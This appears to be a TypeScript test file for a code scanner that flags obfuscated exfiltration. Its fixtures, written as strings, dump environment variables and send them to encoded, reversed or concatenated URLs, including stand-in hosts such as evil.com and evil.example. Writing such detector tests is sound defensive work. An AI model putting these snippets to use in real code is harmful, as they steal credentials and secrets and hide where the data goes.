import assert from 'node:assert/strict';
import test from 'node:test';
import { analyzeContent } from './analyzer.js';

function ids(content: string): string[] {
  return analyzeContent(content).findings.map(finding => finding.patternId);
}

test('detects base64-decoded URL exfiltration', () => {
  const content = `
const endpoint = Buffer.from("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVEVTVA==", "base64").toString("utf8");
await fetch(endpoint, { method: "POST", body: data });
`;
  assert.equal(ids(content).includes('EXFIL_BASE64_URL_DECODE'), true);
});

test('detects hex-escaped URL literals used in network calls', () => {
  const content = `
await fetch("\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x63\\x6f\\x6d\\x2f\\x68\\x69");
`;
  assert.equal(ids(content).includes('EXFIL_HEX_URL_LITERAL'), true);
});

test('detects charcode-constructed URLs used for exfiltration', () => {
  const content = `
const url = String.fromCharCode(104,116,116,112,115,58,47,47,101,120,102,105,108,46,115,105,116,101);
await axios.post(url, payload);
`;
  assert.equal(ids(content).includes('EXFIL_CHARCODE_URL'), true);
});

test('detects reversed string URL obfuscation', () => {
  const content = `
const endpoint = "moc.kcals.skooh//:sptth".split("").reverse().join("");
await fetch(endpoint);
`;
  assert.equal(ids(content).includes('OBFUSC_REVERSED_STRING'), true);
});

test('detects concatenated URL construction', () => {
  const content = `
const endpoint = "ht" + "tps://" + "evil" + ".example" + "/hook";
await fetch(endpoint);
`;
  assert.equal(ids(content).includes('OBFUSC_URL_CONCAT'), true);
});

test('detects env harvesting with obfuscated transmission', () => {
  const content = `
const dump = JSON.stringify(process.env);
const enc = Buffer.from(dump).toString("base64");
const url = "moc.kcals.skooh//:sptth".split("").reverse().join("");
await fetch(url + "/" + enc);
`;
  assert.equal(ids(content).includes('EXFIL_ENV_OBFUSCATED_TRANSMISSION'), true);
});

test('detects python env harvesting with base64 transmit path', () => {
  const content = `
import os, base64, requests
payload = base64.b64encode(str(dict(os.environ)).encode()).decode()
requests.post("https://example.com/ingest/" + payload)
`;
  assert.equal(ids(content).includes('EXFIL_ENV_OBFUSCATED_TRANSMISSION'), true);
});

test('detects urllib3 env harvesting with reversed endpoint', () => {
  const content = `
import os, urllib3
http = urllib3.PoolManager()
u = "moc.elpmaxe//:sptth"[::-1]
http.request("POST", u, body=str(os.environ))
`;
  assert.equal(ids(content).includes('EXFIL_ENV_OBFUSCATED_TRANSMISSION'), true);
});

test('does not flag normal base64 content formatting as exfil url decode', () => {
  const content = `
const pngHeader = Buffer.from("iVBORw0KGgoAAAANSUhEUg==", "base64");
console.log(pngHeader.length);
`;
  assert.equal(ids(content).includes('EXFIL_BASE64_URL_DECODE'), false);
  assert.equal(ids(content).includes('EXFIL_ENV_OBFUSCATED_TRANSMISSION'), false);
});

test('does not flag normal axios API usage as obfuscated exfiltration', () => {
  const content = `
import axios from "axios";
const client = axios.create({ baseURL: "https://api.github.com" });
await client.get("/repos/octocat/Hello-World");
`;
  const findingIds = ids(content);
  assert.equal(findingIds.includes('EXFIL_CHARCODE_URL'), false);
  assert.equal(findingIds.includes('EXFIL_HEX_URL_LITERAL'), false);
  assert.equal(findingIds.includes('OBFUSC_REVERSED_STRING'), false);
  assert.equal(findingIds.includes('OBFUSC_URL_CONCAT'), false);
  assert.equal(findingIds.includes('EXFIL_ENV_OBFUSCATED_TRANSMISSION'), false);
});
